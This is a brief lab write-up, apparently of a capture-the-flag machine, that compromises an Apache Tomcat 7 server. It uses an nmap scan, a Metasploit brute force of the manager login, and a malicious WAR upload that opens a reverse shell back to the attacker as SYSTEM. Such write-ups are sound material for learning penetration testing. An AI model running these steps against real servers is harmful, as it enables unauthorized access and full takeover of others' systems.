JERRY

Started with a standard nmap scan:

sudo nmap -sV 10.129.136.9
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

Browsing to the web port shows us a default Apache page; we can identify its version as Apache Tomcat/7.0.88.

Clicking on "Status" opens a login form; let's try to brute-force it with a dedicated Metasploit module:

msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 10.129.136.9
set RPORT 8080
run
[+] 10.129.136.9:8080 - Login Successful: tomcat:s3cret

Once we have valid credentials, we can try uploading a malicious WAR file that leads to code execution:

use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.129.136.9
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST 10.10.14.194
set LPORT 4444
run

This spawns a shell as NT AUTHORITY\SYSTEM; we find both flags on the Administrator's desktop, in the flags folder.
